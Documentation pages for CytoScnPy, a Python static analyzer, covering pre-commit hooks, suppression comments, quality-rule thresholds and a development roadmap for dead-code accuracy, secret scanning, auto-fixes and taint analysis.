https://github.com/djinn09/CytoScnPy\n    rev: v1.2.1 # Use the latest release tag\n    hooks:\n      - id: cytoscnpy-check\n        # Optional: custom arguments\n        # args: ['--confidence', '60', '--danger', '--quality']\n</code></pre> </li> <li> <p>Install Hooks:     <pre><code>pre-commit install\n</code></pre></p> </li> </ol>"},{"location":"pre-commit/#available-hooks","title":"Available Hooks","text":"Hook ID Description Recommended For <code>cytoscnpy-check</code> Full analysis (security + quality + dead code) General protection <code>cytoscnpy-danger</code> Scans for dangerous patterns (SQLi, XSS, etc.) Security-focused projects <code>cytoscnpy-secrets</code> Scans for hardcoded credentials/API keys All projects <code>cytoscnpy-quality</code> Checks CC, MI, and unused code Maintaining code health <code>cytoscnpy-security</code> <code>cytoscnpy-danger</code> + <code>cytoscnpy-secrets</code> Security hardening"},{"location":"pre-commit/#usage-best-practices","title":"Usage &amp; Best Practices","text":""},{"location":"pre-commit/#selective-analysis","title":"Selective Analysis","text":"<p>If you only want to fail on security issues but want to see quality warnings, use separate hooks:</p> <pre><code>- id: cytoscnpy-security\n  args: [\"--fail-threshold\", \"0\"]\n- id: cytoscnpy-quality\n  args: [\"--fail-on-quality\", \"false\"]\n</code></pre>"},{"location":"pre-commit/#strictness-levels","title":"Strictness Levels","text":"<p>You can enforce strict quality gates using these flags in <code>args</code>:</p> <ul> <li><code>--fail-on-quality</code>: Exit with code 1 if any quality issues are found.</li> <li><code>--fail-threshold &lt;N&gt;</code>: Fail if unused code percentage exceeds N.</li> <li><code>--max-complexity &lt;N&gt;</code>: Fail if any function exceeds complexity N.</li> </ul>"},{"location":"pre-commit/#performance","title":"Performance","text":"<p>CytoScnPy is built in Rust and is designed to be extremely fast. However, for very large monorepos, you may want to limit the frequency:</p> <pre><code>- id: cytoscnpy-check\n  stages: [push] # Only run on push instead of every commit\n</code></pre>"},{"location":"pre-commit/#troubleshooting","title":"Troubleshooting","text":""},{"location":"pre-commit/#too-many-open-files","title":"\"Too many open files\"","text":"<p>If running on thousands of files at once, you might hit OS limits. You can limit the hook to specific directories:</p> <pre><code>hooks:\n  - id: cytoscnpy-check\n    files: ^src/\n</code></pre>"},{"location":"pre-commit/#suppression","title":"Suppression","text":"<p>To ignore a specific finding on a line, use any of these formats:</p> <pre><code>def legacy_function():  # noqa\n    pass  # bare noqa suppresses all\n\nunused_var = 1  # ignore\n    # bare ignore also suppresses all\n\nsecret_key = \"...\"  # pragma: no cytoscnpy\n    # legacy format, still supported\n\nother_var = value  # noqa: E501, CSP\n    # mixed codes: suppresses CytoScnPy because CSP is in the list\n</code></pre> <p>[!NOTE] Inline suppression comments (<code># noqa</code>, <code># ignore</code>, <code># pragma: no cytoscnpy</code>) apply to dead code, security, quality, and clone findings on a specific line. For ignoring rules across the entire project, use the <code>ignore</code> list in your <code>.cytoscnpy.toml</code> configuration file.</p>"},{"location":"quality/","title":"Code Quality Rules","text":"<p>CytoScnPy detects common Python code quality issues and maintains alignment with industry-standard linting codes (Flake8, Bugbear, Pylint).</p> <p>Enable quality analysis with the <code>--quality</code> flag:</p> <pre><code>cytoscnpy . --quality\n</code></pre>"},{"location":"quality/#best-practices","title":"Best Practices","text":"Name Description <code>MutableDefaultArgumentRule</code> Detects mutable default arguments (lists, dicts, sets). <code>BareExceptRule</code> Detects <code>except:</code> blocks without a specific exception class. <code>DangerousComparisonRule</code> Detects comparisons to <code>True</code>, <code>False</code>, or <code>None</code> using <code>==</code> instead of <code>is</code>."},{"location":"quality/#maintainability-complexity","title":"Maintainability &amp; Complexity","text":"Name Description <code>ComplexityRule</code> Function cyclomatic complexity (McCabe) exceeds threshold. <code>NestingRule</code> Code block is nested too deeply. <code>ArgumentCountRule</code> Function has too many arguments. <code>FunctionLengthRule</code> Function is too long (lines of code)."},{"location":"quality/#configuration","title":"Configuration","text":"<p>You can tune the thresholds for quality rules in your <code>.cytoscnpy.toml</code>:</p> <pre><code>[cytoscnpy]\nmax_complexity = 15    # Default: 10\nmax_nesting = 4        # Default: 3\nmax_args = 6           # Default: 5\nmax_lines = 100        # Default: 50\n</code></pre>"},{"location":"quality/#suppression","title":"Suppression","text":"<p>Use the standard <code># noqa</code> syntax to suppress specific findings. Note that Rule IDs for quality checks are currently under migration; use generic <code># noqa</code> to suppress all quality findings on a line:</p> <pre><code>def my_function(arg=[]):  # noqa\n    pass\n\ntry:\n    do_something()\nexcept:  # noqa\n    pass\n</code></pre>"},{"location":"roadmap/","title":"CytoScnPy - Roadmap &amp; Development Guide","text":"<p>Architecture: Hybrid PyO3 + Standalone CLI Status: Production-ready core, active development</p> <p>For completed features and implementation history, see GitHub Releases.</p>"},{"location":"roadmap/#table-of-contents","title":"\ud83d\udccb Table of Contents","text":"<ol> <li>Project Status</li> <li>In Progress</li> <li>Future Roadmap</li> <li>Phase 9: Developer Experience</li> <li>Phase 10: Deep Analysis &amp; Security</li> <li>Phase 11: Auto-Remediation</li> </ol>"},{"location":"roadmap/#project-status","title":"Project Status","text":""},{"location":"roadmap/#in-progress","title":"In Progress","text":""},{"location":"roadmap/#57-radon-parity-gaps-in-progress","title":"5.7 Radon Parity Gaps \ud83d\udd04 IN PROGRESS","text":"<p>Status: Tests added, implementation pending. See <code>cytoscnpy/tests/radon_parity_*.rs</code></p> <p>These features are tested but not yet implemented. Remove <code>#[ignore]</code> from tests when implementing.</p>"},{"location":"roadmap/#complexity-gaps-19-tests-ignored","title":"Complexity Gaps (19 tests ignored)","text":"Feature Description Test File Radon Behavior Module-level complexity Complexity of code outside functions <code>radon_parity_complexity_test.rs</code> Radon reports module-level <code>if</code>/<code>for</code>/<code>while</code> etc. For/while else clause <code>else:</code> on loops adds +1 complexity <code>radon_parity_complexity_test.rs</code> Radon counts loop <code>else:</code> as branch Try-except else clause <code>else:</code> on try adds +1 complexity <code>radon_parity_complexity_test.rs</code> Radon counts try <code>else:</code> as branch Lambda ternary Ternary inside lambda adds complexity <code>radon_parity_complexity_test.rs</code> Ternary in lambda body counts Ternary with generator Generator inside ternary <code>radon_parity_complexity_test.rs</code> Nested comprehension complexity Match wildcard <code>case _:</code> shouldn't add complexity <code>radon_parity_complexity_test.rs</code> Wildcard is default, not branch Nested generator Inner generator adds complexity <code>radon_parity_complexity_test.rs</code> Each <code>for</code>/<code>if</code> in nested generator Class method <code>or</code> Boolean <code>or</code> in condition <code>radon_parity_complexity_test.rs</code> <code>or</code> adds +1 complexity"},{"location":"roadmap/#halstead-gaps-1-test-ignored","title":"Halstead Gaps (1 test ignored)","text":"Feature Description Test File Radon Behavior Distinct operand counting <code>if a and b: elif b or c:</code> <code>radon_parity_halstead_test.rs</code> <code>b</code> counted once as distinct"},{"location":"roadmap/#raw-metrics-gaps-2-tests-ignored","title":"Raw Metrics Gaps (2 tests ignored)","text":"Feature Description Test File Radon Behavior Line continuation with string Backslash + multiline string <code>radon_parity_raw_test.rs</code> Continuation counted correctly Line continuation with comment Backslash + inline comment <code>radon_parity_raw_test.rs</code> Comment on continuation line"},{"location":"roadmap/#implementation-priority","title":"Implementation Priority","text":"<ol> <li>Module-level complexity - High impact (8 tests), required for full Radon parity</li> <li>Loop/try else clauses - Medium impact (5 tests), common pattern</li> <li>Match wildcard handling - Low impact (2 tests), Python 3.10+ only</li> <li>Halstead/Raw edge cases - Low impact (3 tests), edge cases</li> </ol>"},{"location":"roadmap/#phase-8-cfg-integration-done","title":"Phase 8: CFG Integration \u2705 DONE","text":""},{"location":"roadmap/#81-control-flow-graph-construction","title":"8.1 Control Flow Graph Construction \u2705","text":"<p>Implemented CFG construction from Python AST for behavioral analysis:</p> <ul> <li>CFG Builder: Constructs basic blocks from <code>StmtFunctionDef</code></li> <li>Control Flow: Handles <code>if</code>, <code>for</code>, <code>while</code>, <code>try</code>, <code>match</code>, <code>break</code>, <code>continue</code>, <code>return</code>, <code>raise</code></li> <li>Loop Depth: Tracks nesting depth for each basic block</li> <li>Fingerprinting: Behavioral signature for clone comparison</li> </ul>"},{"location":"roadmap/#82-clone-detection-integration","title":"8.2 Clone Detection Integration \u2705","text":"<p>CFG validation as secondary filter for clone detection:</p> Feature Description <code>cfg_validation</code> config Enable/disable CFG validation in <code>CloneConfig</code> <code>validate_with_cfg()</code> Phase 4.5 filter in <code>CloneDetector::detect()</code> <code>cfg_validated</code> context +15 confidence boost in <code>ConfidenceScorer</code> 70% similarity threshold CFG pairs below this are filtered out"},{"location":"roadmap/#83-feature-flag","title":"8.3 Feature Flag","text":"<p>Enabled via <code>--features cfg</code> at compile time:</p> <pre><code>cargo build --features cfg\ncargo test --features cfg\n</code></pre>"},{"location":"roadmap/#phase-6-editor-integration-done","title":"Phase 6: Editor Integration \u2705 DONE","text":""},{"location":"roadmap/#61-vs-code-extension-in-progress","title":"6.1 VS Code Extension \ud83d\udd04 IN PROGRESS","text":""},{"location":"roadmap/#62-extension-code-audit-pending-fixes-in-progress","title":"6.2 Extension Code Audit (Pending Fixes) \ud83d\udd04 IN PROGRESS","text":""},{"location":"roadmap/#623-json-parsing-completeness","title":"6.2.3 JSON Parsing Completeness \u2705","text":"<p>Fields in CLI JSON output not captured by <code>analyzer.ts</code>:</p> <ul> <li>[ ] Add <code>summary</code> stats display in output channel</li> </ul>"},{"location":"roadmap/#624-missing-commands","title":"6.2.4 Missing Commands \ud83d\udd04","text":"Command Description Status <code>cytoscnpy.taintAnalysis</code> Run taint analysis specifically \u274c"},{"location":"roadmap/#625-path-handling","title":"6.2.5 Path Handling \u2705","text":"<ul> <li>[ ] Add macOS (<code>cytoscnpy-cli-darwin</code>) binary bundling</li> <li>[ ] Add Linux (<code>cytoscnpy-cli-linux</code>) binary bundling</li> </ul>"},{"location":"roadmap/#626-ux-enhancements","title":"6.2.6 UX Enhancements","text":"Feature Description Priority Status Status Bar Show finding count in status bar Medium \u274c Sidebar Badge Show issue count in Explorer sidebar Medium \u2705 Quick Fixes Code actions to remove/comment unused code High \u2705 Gutter Decorations Visual icons for severity levels Low \u2705 Progress Indicator Show progress during workspace analysis Medium \u274c File Caching Skip re-analyzing unchanged files Low \u2705 Problem Grouping Better categorization in Problems panel Low \u2705"},{"location":"roadmap/#phase-7-infrastructure-quality-done","title":"Phase 7: Infrastructure &amp; Quality \u2705 DONE","text":""},{"location":"roadmap/#72-error-handling","title":"7.2 Error Handling \u2705","text":""},{"location":"roadmap/#73-parser-migration-rustpython-parser-ruff_python_parser","title":"7.3 Parser Migration: <code>rustpython-parser</code> \u2192 <code>ruff_python_parser</code> \u2705","text":"<p>Reference: See RustPython/Cargo.toml for working example.</p>"},{"location":"roadmap/#phase-75-performance-optimizations-done","title":"Phase 7.5: Performance Optimizations \u2705 DONE","text":""},{"location":"roadmap/#pending-optimizations-low-priority","title":"\ud83d\udd04 Pending Optimizations (Low Priority)","text":"Optimization Description Priority Complexity Est. Impact Reduce remaining <code>.clone()</code> calls Audit and eliminate unnecessary clones (~50+ remaining) Low Low 2-5% String interning Use <code>string-cache</code> crate for repeated strings (module names, type names) Low Medium 3-5% Profile-Guided Optimization (PGO) Build with profile data for 5-10% improvement Low Medium 5-10% Parallel AST traversal Split large files for parallel statement processing Very Low High 10-20% on large files"},{"location":"roadmap/#not-needed-deferred","title":"\u274c Not Needed / Deferred","text":"Optimization Reason Scope resolution caching Already optimized via <code>cached_scope_prefix</code> Arc\\&lt;String&gt; for module_name Would require significant refactoring, marginal benefit FxHashSet audit Already using <code>FxHashSet</code> in most places"},{"location":"roadmap/#phase-76-accuracy-improvements-in-progress","title":"Phase 7.6: Accuracy Improvements \ud83d\udd04 IN PROGRESS","text":"<p>Systematic improvements to detection accuracy based on benchmark analysis.</p> <p>Current Status: F1 = 0.72 (110 TP, 46 FP, 38 FN)</p>"},{"location":"roadmap/#761-completed-fixes","title":"7.6.1 Completed Fixes \u2705","text":"<ul> <li>[x] Framework Decorator Tracking: Accurate detection for FastAPI, Django, and Celery entry points.</li> <li>[x] TYPE_CHECKING Block Handling: Correctly ignores imports used only in type-check blocks.</li> <li>[x] F-string Reference Detection: Tracking variables and functions referenced within f-string interpolations.</li> <li>[x] Multi-line String LOC: Improved metrics for backslash-continued strings and comments.</li> </ul>"},{"location":"roadmap/#762-remaining-false-positives-34-items","title":"7.6.2 Remaining False Positives (34 items)","text":"<p>Items incorrectly flagged as unused.</p> Category Count Issue Priority Fix Difficulty Functions 17 Closures, returned functions, pattern matching bindings High Medium Imports 6 Cross-file <code>__all__</code> re-exports, FastAPI <code>Depends</code> High Medium Variables 6 Closure captures, complex scoping Medium Hard Methods 3 Pydantic <code>from_dict</code>/<code>to_dict</code> patterns Low Easy Classes 2 FastAPI response models (<code>In</code>, <code>Out</code>) Low Easy"},{"location":"roadmap/#priority-1-cross-file-__all__-tracking","title":"Priority 1: Cross-File <code>__all__</code> Tracking","text":"<p>Problem: Imports re-exported via <code>__all__</code> in other modules are flagged:</p> <pre><code># module_a.py\nfrom module_b import ExportedClass  # Flagged as unused\n\n# module_b.py\n__all__ = [\"ExportedClass\"]  # Should mark as used across files\n</code></pre> <p>Solution: Track <code>__all__</code> exports globally and match against imports in other files.</p>"},{"location":"roadmap/#priority-2-pattern-matching-bindings","title":"Priority 2: Pattern Matching Bindings","text":"<p>Problem: Variables bound in <code>match</code> statements are flagged:</p> <pre><code>match command:\n    case (action, value):  # 'action' and 'value' flagged as unused\n        handle(action, value)\n</code></pre> <p>Solution: Track <code>match</code> case bindings as references.</p>"},{"location":"roadmap/#priority-3-returned-inner-functions","title":"Priority 3: Returned Inner Functions","text":"<p>Problem: Functions returned from factory functions are flagged:</p> <pre><code>def factory():\n    def inner():  # Flagged as unused\n        pass\n    return inner  # Should mark 'inner' as used\n</code></pre> <p>Status: \u2705 Fixed in return statement tracking improvements.</p>"},{"location":"roadmap/#763-remaining-false-negatives-60-items","title":"7.6.3 Remaining False Negatives (60 items)","text":"<p>Genuinely unused items we fail to detect.</p> Category Count Issue Priority Fix Difficulty Functions 19 Pragma-ignored, security examples, FastAPI deps Low N/A (intentional) Variables 18 Complex scoping, pattern matching, class attrs High Medium Imports 12 Various tracking gaps Medium Medium Methods 10 Methods inside unused classes not linked High Medium Classes 1 Complex inheritance patterns Low Hard"},{"location":"roadmap/#priority-1-class-method-linking-done","title":"Priority 1: Class-Method Linking \u2705 DONE","text":"<p>Problem: Methods inside unused classes are not detected.</p> <pre><code>class UnusedClass:  # Detected as unused \u2705\n    def method(self):  # NOW detected via cascading detection \u2705\n        pass\n</code></pre> <p>Solution: When a class is unused, automatically mark all its methods as unused (cascading deadness).</p> <p>Implementation: Modified <code>aggregate_results()</code> and <code>analyze_code()</code> in <code>processing.rs</code> to flag all methods within unused classes. Respects heuristic protections (visitor pattern methods are excluded).</p>"},{"location":"roadmap/#priority-2-variable-scope-improvements","title":"Priority 2: Variable Scope Improvements","text":"<p>Problem: Local variables in complex scopes are missed.</p> <pre><code>def func():\n    x = 1  # Never used after assignment - should be flagged\n    y = process()\n    return y\n</code></pre> <p>Solution: Improve variable liveness analysis within function scopes.</p>"},{"location":"roadmap/#priority-3-import-detection-gaps","title":"Priority 3: Import Detection Gaps","text":"<p>Problem: Some import patterns not detected:</p> <ul> <li>Imports in type annotations without string quotes</li> <li>Imports used only in comprehensions</li> <li>Star imports (<code>from x import *</code>)</li> </ul>"},{"location":"roadmap/#764-accuracy-improvement-roadmap","title":"7.6.4 Accuracy Improvement Roadmap","text":"Phase Target F1 Key Fixes Status 7.6.1 0.63 Return annotations, TYPE_CHECKING \u2705 Done 7.6.2 0.68 Cross-file <code>__all__</code>, pattern matching \ud83d\udd04 Planned 7.6.3 0.72 Class-method linking, variable scopes \ud83d\udd04 Planned 7.6.4 0.75 Import gaps, framework patterns \ud83d\udd04 Planned"},{"location":"roadmap/#phase-8-advanced-framework-support-done","title":"Phase 8: Advanced Framework Support \u2705 DONE","text":"<p>Django, FastAPI, Pydantic is done \u2705.</p>"},{"location":"roadmap/#future-roadmap","title":"Future Roadmap","text":""},{"location":"roadmap/#phase-9-developer-experience","title":"Phase 9: Developer Experience","text":"<p>Tools to improve the workflow around CytoScnPy.</p> <ul> <li>[x] Git Hooks (pre-commit) \u2705</li> <li>Automated analysis on commit/push.</li> <li>See <code>docs/pre-commit.md</code> for setup instructions.</li> <li>[x] CI/CD Integration Examples \u2705</li> <li>Reference workflows for GitHub Actions provided in <code>.github/workflows/</code>.</li> <li>Supports <code>--fail-on-quality</code> and <code>--fail-threshold</code> for gatekeeping.</li> <li>[x] uv Package Manager Integration \u2705</li> <li>Full support for <code>uv</code>-managed environments.</li> <li> <p>Used in official lint/CI workflows.</p> </li> <li> <p>[ ] MCP HTTP/SSE Transport</p> </li> <li>Add HTTP/SSE transport for remote LLM integrations (web-based clients, APIs).</li> <li>Challenges to Address:<ul> <li>Path validation/sandboxing for security</li> <li>Timeout handling for large project analysis (30-60s)</li> </ul> </li> <li>Remote Analysis Tools:     | Tool | Input | Use Case |     |------|-------|----------|     | <code>analyze_code</code> | Code string | Small snippets (already works) |     | <code>analyze_files</code> | JSON map of files | Medium projects via upload |     | <code>analyze_repo</code> | Git URL | Clone &amp; analyze public repos |     | <code>analyze_path</code> | Local path | Server-local files only |</li> <li> <p>Implementation:</p> <ul> <li>Add <code>--http --port 3000</code> CLI flags for transport selection</li> <li>Use <code>rmcp</code> SSE transport feature</li> <li>Add Git clone support for <code>analyze_repo</code> tool</li> </ul> </li> <li> <p>[ ] LSP Server (Language Server Protocol)</p> </li> <li>Implement a real-time LSP server for VS Code, Neovim, and Zed.</li> <li> <p>Provide instant diagnostics without saving or running CLI.</p> </li> <li> <p>[ ] Config File Support for Notebook Options</p> </li> <li>Allow <code>include_ipynb</code> and <code>ipynb_cells</code> in <code>.cytoscnpy.toml</code> and <code>pyproject.toml</code></li> <li>Currently these are CLI-only flags (<code>--include-ipynb</code>, <code>--ipynb-cells</code>)</li> <li>Rationale: Enable persistent configuration without passing flags on every run</li> <li> <p>Implementation: Add fields to <code>CytoScnPyConfig</code> struct in <code>src/config.rs</code></p> </li> <li> <p>[ ] Git Integration</p> </li> <li>Blame Analysis: Identify who introduced unused code.</li> <li> <p>Incremental Analysis: Analyze only files changed in the current PR/commit.</p> </li> <li> <p>[x] HTML Report Generation \u2705</p> </li> <li>Generate self-contained HTML reports for large codebase analysis.</li> <li>Features:<ul> <li>Syntax highlighting (using highlight.js or prism.js)</li> <li>Clickable file links with line numbers</li> <li>Filtering by type (unused, security, quality), severity, file</li> <li>Search across all findings</li> <li>Summary dashboard with charts</li> <li>Code snippets showing context around each finding (Basic impl done, see Phase 9.5 for improvements)</li> </ul> </li> <li>CLI: <pre><code>cytoscnpy ./project --html\n# Multi-file support planned for large projects\n</code></pre></li> <li> <p>Implementation:</p> <ul> <li>Use <code>tera</code> or <code>askama</code> for templating</li> <li>Embed CSS/JS for self-contained output</li> <li>Optional: Split large reports into multiple HTML files with index</li> </ul> </li> <li> <p>[x] Security Documentation Overhaul \u2705</p> </li> <li>Categorized all 50+ danger rules into logical modules (Code Execution, Injection, etc.).</li> <li>Ensured 1:1 parity between documentation and Rust implementation (severities, patterns).</li> <li>Added safer alternatives and remediation advice for all rules.</li> <li> <p>See Dangerous Code Rules for details.</p> </li> <li> <p>[ ] Live Server Mode</p> </li> <li>Built-in HTTP server to browse analysis results interactively.</li> <li>Features:<ul> <li>Auto-refresh on file changes (watch mode)</li> <li>REST API for findings (JSON endpoints)</li> <li>Interactive code browser with inline annotations</li> <li>Severity/type filters with live updates</li> </ul> </li> <li>CLI: <pre><code>cytoscnpy serve ./project --port 8080\n</code></pre></li> <li>Technical Approach:<ul> <li>Use <code>axum</code> or <code>warp</code> for lightweight HTTP server</li> <li>WebSocket for live updates</li> <li>Serve static HTML + JSON API</li> </ul> </li> <li>Use Cases:<ul> <li>Team code review sessions</li> <li>CI/CD dashboard integration</li> <li>Local development feedback loop</li> </ul> </li> </ul>"},{"location":"roadmap/#phase-95-report-actionability-upgrade-planned","title":"Phase 9.5: Report Actionability Upgrade \ud83d\udd04 PLANNED","text":"<p>Implementing findings from the Recommendation System Audit.</p> <p>Goal: Transform the report from a diagnostic tool into a remediation platform.</p> <ul> <li>[ ] Remediation Display Engine (Priority: HIGH)</li> <li>Problem: Backend has remediation data (e.g., \"Use parameterized queries\"), but it's lost during report generation.</li> <li> <p>Solution:</p> <ul> <li>Extend <code>IssueItem</code> struct with <code>remediation</code> and <code>vuln_type</code> fields.</li> <li>Update <code>flatten_issues</code> to preserve <code>SinkInfo</code> remediation strings.</li> <li>Update <code>issues.html</code> and <code>file_view.html</code> to display a collapsible \"Remediation\" box.</li> </ul> </li> <li> <p>[ ] Context-Aware Code Snippets (Priority: MEDIUM)</p> </li> <li>Problem: Issues are shown as one-liners without context.</li> <li> <p>Solution:</p> <ul> <li>Extract 3-5 lines of code around the issue location.</li> <li>Display syntax-highlighted snippets inline in the Issues tab.</li> </ul> </li> <li> <p>[ ] Enriched Quality Messages (Priority: MEDIUM)</p> </li> <li>Problem: Generic messages like \"Function too complex\" offer no guidance.</li> <li> <p>Solution: Map rule IDs to specific refactoring advice (e.g., \"Extract reusable logic into helper functions\").</p> </li> <li> <p>[ ] Prioritization Framework (Priority: LOW)</p> </li> <li>Problem: All high-severity issues look the same.</li> <li>Solution: Add \"Exploitability\" and \"Fix Effort\" scores to help teams prioritize.</li> </ul>"},{"location":"roadmap/#benchmarking-infrastructure-ideas","title":"Benchmarking Infrastructure Ideas","text":"Component Description Tools/Approaches Containerized Execution Isolated, reproducible environments Docker, Podman Cross-Platform Matrix Test on Windows, Linux, macOS GitHub Actions matrix Python Version Matrix Test with Python 3.8-3.12 tox, nox Memory Profiling Track peak RSS, allocations tracemalloc, memory_profiler CPU Profiling Identify bottlenecks py-spy, cProfile Differential Testing Compare outputs between tool versions Custom diff scripts Regression Testing Detect accuracy/performance regressions Baseline JSON comparison"},{"location":"roadmap/#suggested-future-improvements","title":"Suggested Future Improvements","text":"<ol> <li>Expand Ground Truth: Add more test cases for edge cases (decorators, type hints, async code)</li> <li>Real-World Validation: Run on popular open-source projects (Django, Flask, requests)</li> <li>Add MCC Metric: Better handles imbalanced detection categories</li> <li>Per-File Breakdown: Show which specific test files each tool struggles with</li> <li>Confidence Threshold Sweep: Test Vulture at multiple confidence levels (0%, 30%, 60%, 90%)</li> <li>Cross-Language Comparison: Compare Python tools with similar tools for other languages</li> </ol>"},{"location":"roadmap/#phase-10-deep-analysis-security","title":"Phase 10: Deep Analysis &amp; Security","text":"<p>Pushing the boundaries of static analysis.</p> <ul> <li>[x] Secret Scanning 2.0</li> <li> <p>Enhance regex scanning with entropy analysis to reduce false positives for API keys.</p> </li> <li> <p>[x] AST-Based Suspicious Variable Detection (Secret Scanning 3.0) \u2705</p> </li> <li>Problem: Current regex patterns only detect secrets when the value matches a known format (e.g., <code>ghp_xxx</code>). This misses hardcoded secrets assigned to suspiciously named variables:     <pre><code>database_password = \"hunter2\"        # Missed - no pattern match\nconfig['api_secret'] = some_value    # Missed - dict subscript\n</code></pre></li> <li>Solution: Leverage existing <code>CytoScnPyVisitor</code> AST traversal to detect assignments to suspicious variable names, regardless of the value format.</li> <li> <p>Implementation:</p> <pre><code>// In visitor.rs - when visiting Assign nodes:\nconst SUSPICIOUS_NAMES: &amp;[&amp;str] = &amp;[\n    \"password\", \"secret\", \"key\", \"token\", \"auth\", \"credential\",\n    \"api_key\", \"apikey\", \"private_key\", \"access_token\", \"pwd\"\n];\n\nfn matches_suspicious_name(name: &amp;str) -&gt; bool {\n    let lower = name.to_lowercase();\n    SUSPICIOUS_NAMES.iter().any(|s| lower.contains(s))\n}\n\n// When visiting an Assign node:\nif matches_suspicious_name(&amp;target_name) {\n    if let Some(string_value) = extract_string_value(&amp;node.value) {\n        findings.push(SecretFinding {\n            message: format!(\"Suspicious assignment to '{}'\", target_name),\n            rule_id: \"CSP-S300\".to_owned(),\n            file: file_path.clone(),\n            line: node.range.start.row.get(),\n            severity: \"MEDIUM\".to_owned(),\n            matched_value: Some(redact_value(&amp;string_value)),\n            entropy: None,\n        });\n    }\n}\n</code></pre> </li> <li> <p>Patterns to Detect:</p> <ul> <li>Simple assignments: <code>db_password = \"secret123\"</code></li> <li>Dict subscripts: <code>config['api_key'] = \"token\"</code></li> <li>Attribute assignments: <code>self.secret_key = \"value\"</code></li> </ul> </li> <li>False Positive Mitigation:<ul> <li>Skip if value is <code>os.environ.get(...)</code> or <code>os.getenv(...)</code></li> <li>Skip if value references another variable (non-literal)</li> <li>Skip if in test files (lower severity)</li> </ul> </li> <li>Files: <code>src/visitor.rs</code>, <code>src/rules/secrets.rs</code></li> <li> <p>New Rule ID: <code>CSP-S300</code> (Suspicious Variable Assignment)</p> </li> <li> <p>[x] Modular Secret Recognition Engine (Secret Scanning 4.0) \u2705</p> </li> <li> <p>Goal: Refactor secret detection into a pluggable, trait-based architecture with unified context-based scoring.</p> </li> <li> <p>Architecture: <pre><code>SecretScanner (Orchestrator)\n       \u2502\n       \u251c\u2500\u2500 RegexRecognizer (built-in patterns)\n       \u251c\u2500\u2500 AstRecognizer (variable name detection)\n       \u251c\u2500\u2500 EntropyRecognizer (high-entropy strings)\n       \u2514\u2500\u2500 CustomRecognizer (user-defined via TOML)\n                  \u2502\n                  \u25bc\n          Context Scoring Engine\n          (proximity, file type, pragma, dedup)\n                  \u2502\n                  \u25bc\n          Final Findings (scored &amp; filtered)\n</code></pre></p> </li> <li>Pluggable Recognizers (Trait-based): <pre><code>pub trait SecretRecognizer: Send + Sync {\n    fn name(&amp;self) -&gt; &amp;str;\n    fn base_score(&amp;self) -&gt; u8;  // 0-100\n    fn scan(&amp;self, content: &amp;str, line: usize) -&gt; Vec&lt;RawFinding&gt;;\n}\n</code></pre></li> <li>Context-Based Scoring Rules:     | Signal | Adjustment | Rationale |     |--------|------------|-----------|     | Near keyword (<code>api_key=</code>) | +20 | High confidence |     | In test file | -50 | Likely fake |     | In comment | -10 | Documentation |     | High entropy | +15 | Random = suspicious |     | Known FP pattern (URL/path) | -100 | Skip |     | <code>os.environ.get()</code> | -100 | Not hardcoded |</li> <li> <p>Configuration (TOML):</p> <pre><code>[secrets]\nmin_score = 50  # Only report &gt;= 50\n\n[secrets.recognizers.ast]\nsuspicious_names = [\"password\", \"secret\", \"key\", \"token\"]\n\n[[secrets.custom_recognizers]]\nname = \"Internal Token\"\nregex = \"INTERNAL_[A-Z0-9]{16}\"\nscore = 90\n</code></pre> </li> <li> <p>Implementation Plan:</p> <ol> <li>Add <code>confidence: u8</code> to <code>SecretFinding</code> struct</li> <li>Create <code>SecretRecognizer</code> trait in <code>src/rules/recognizers/mod.rs</code></li> <li>Refactor existing patterns into <code>RegexRecognizer</code></li> <li>Implement <code>AstRecognizer</code> (CSP-S300)</li> <li>Create <code>ContextScorer</code> with scoring rules</li> <li>Update <code>scan_secrets()</code> to use orchestrator pattern</li> <li>Add TOML config for custom recognizers</li> </ol> </li> <li> <p>Files:</p> <ul> <li><code>src/rules/secrets.rs</code> \u2192 <code>src/rules/secrets/mod.rs</code> (split)</li> <li><code>src/rules/secrets/recognizers.rs</code> (new)</li> <li><code>src/rules/secrets/scoring.rs</code> (new)</li> <li><code>src/config.rs</code> (extend <code>SecretsConfig</code>)</li> </ul> </li> <li> <p>[ ] Dependency Graph \ud83d\udd04 IN PROGRESS</p> </li> <li>Generate DOT/Mermaid graphs of module dependencies to aid refactoring.</li> <li> <p>Core <code>CallGraph</code> infrastructure implemented in <code>cytoscnpy/src/taint/call_graph.rs</code>.</p> </li> <li> <p>[ ] License Compliance</p> </li> <li>Scan <code>requirements.txt</code> and <code>Cargo.toml</code> for incompatible licenses.</li> </ul>"},{"location":"roadmap/#phase-11-auto-remediation-done","title":"Phase 11: Auto-Remediation \u2705 DONE","text":"<p>Safe, automated code fixes.</p> <ul> <li>[x] Safe Code Removal (<code>--fix</code>)</li> <li>Implementation: Use AST byte ranges from <code>ruff_python_parser</code> for precise removal.</li> <li>Features:<ul> <li><code>--fix</code> flag removes unused functions, classes, and imports</li> <li><code>--dry-run</code> previews changes without applying</li> <li>CST mode (tree-sitter) is now enabled by default for better comment preservation</li> <li>Only high-confidence items (\u226590%) are auto-fixed</li> <li>Cascading detection: methods inside unused classes are auto-removed with their parent class</li> </ul> </li> </ul>"},{"location":"roadmap/#phase-12-security-lifecycle","title":"Phase 12: Security &amp; Lifecycle","text":"<ul> <li>[ ] Fuzzing Environment Stabilization</li> <li>Fuzzing is currently difficult on Windows due to MSVC toolchain and sanitizer runtime issues.</li> <li>Solution: Transition fuzzing CI to a purely Linux-based environment (or WSL).</li> <li>This allows reliable <code>cargo fuzz</code> execution to catch edge-case crashes and undefined behavior.</li> <li>Implementation: Add a <code>fuzz-linux.yml</code> workflow that runs in Ubuntu and uses <code>cargo +nightly fuzz</code>.</li> </ul>"},{"location":"roadmap/#phase-13-interprocedural-taint-analysis","title":"Phase 13: Interprocedural Taint Analysis","text":"<p>Deep data-flow analysis across function boundaries.</p> <ul> <li>[ ] Global Call Graph Construction \ud83d\udd04 IN PROGRESS</li> <li>Map function calls across the entire project to track how data moves between modules.</li> <li>Necessary for tracking \"taint\" from a source in one file to a sink in another.</li> <li>[ ] Cross-Function Taint Tracking</li> <li>Store and propagate \"taint state\" for function arguments and return values.</li> <li>Goal: Catch vulnerabilities like an API request being passed through a helper function into an <code>eval()</code> or SQL query.</li> <li>[ ] Sanitization Recognition</li> <li>Detect when tainted data passes through \"safe\" functions (like <code>html.escape()</code> or custom sanitizers).</li> <li>Benefit: Significantly reduces False Positives by knowing when data is no longer dangerous.</li> <li>[ ] Framework-Specific Entry Points</li> <li>Add deep support for FastAPI dependencies, Django middleware, and Flask request hooks.</li> <li>Benefit: Provides \"Premium\" level security coverage for modern Python web applications.</li> </ul> <p>135 